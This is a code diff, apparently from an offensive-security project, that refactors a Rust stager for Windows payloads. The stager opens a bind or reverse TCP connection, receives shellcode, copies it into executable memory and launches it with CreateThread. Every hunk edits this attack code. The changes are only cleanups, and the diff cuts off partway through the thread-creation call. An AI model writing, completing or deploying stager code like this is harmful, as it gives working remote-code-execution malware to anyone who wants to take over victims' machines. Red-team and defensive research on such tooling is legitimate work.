@@ -6,28 +6,24 @@ use std::os::windows::io::AsRawSocket;
 use windows::Win32::System::{Memory::*, Threading::*};
 
 /// Implement the main logic of the program
-pub fn run(addr: String) -> Result<(), Box<dyn Error>> {
-    let stream = match addr.starts_with(':') {
+pub fn run(addr: &str) -> Result<(), Box<dyn Error>> {
+    let stream = if addr.starts_with(':') {
         // Start a bind_tcp stager
-        true => {
-            let addr = format!("0.0.0.0{addr}");
-            println!("[*] Using bind_tcp stager ({addr})");
-            let listener = TcpListener::bind(&addr)?;
-            let (stream, _) = listener.accept()?;
-            stream
-        }
-
+        let addr = format!("0.0.0.0{addr}");
+        println!("[*] Using bind_tcp stager ({addr})");
+        let listener = TcpListener::bind(&addr)?;
+        let (stream, _) = listener.accept()?;
+        stream
+    } else {
         // Start a reverse_tcp stager
-        false => {
-            println!("[*] Using reverse_tcp stager ({addr})");
-            TcpStream::connect(&addr)?
-        }
+        println!("[*] Using reverse_tcp stager ({addr})");
+        TcpStream::connect(addr)?
     };
 
     // Receive and execute the payload
     let payload = payload_recv(&stream)?;
     println!("[+] Payload received!");
-    payload_exec(payload);
+    payload_exec(&payload);
 
     Ok(())
 }
@@ -54,7 +50,7 @@ fn payload_recv(stream: &TcpStream) -> Result<Vec<u8>, Box<dyn Error>> {
 }
 
 /// Execute a Windows payload
-fn payload_exec(payload: Vec<u8>) {
+fn payload_exec(payload: &[u8]) {
     const MEM_COMMIT: u32 = 0x1000;
     const MEM_RESERVE: u32 = 0x2000;
     const INFINITE: u32 = 0xFFFFFFFF;
@@ -76,6 +72,7 @@ fn payload_exec(payload: Vec<u8>) {
     // Copy and execute the payload
     unsafe {
         std::ptr::copy_nonoverlapping(payload.as_ptr(), ptr as *mut u8, payload.len());
+        #[allow(clippy::missing_transmute_annotations)]
         let _ = CreateThread(
             None,
             0,
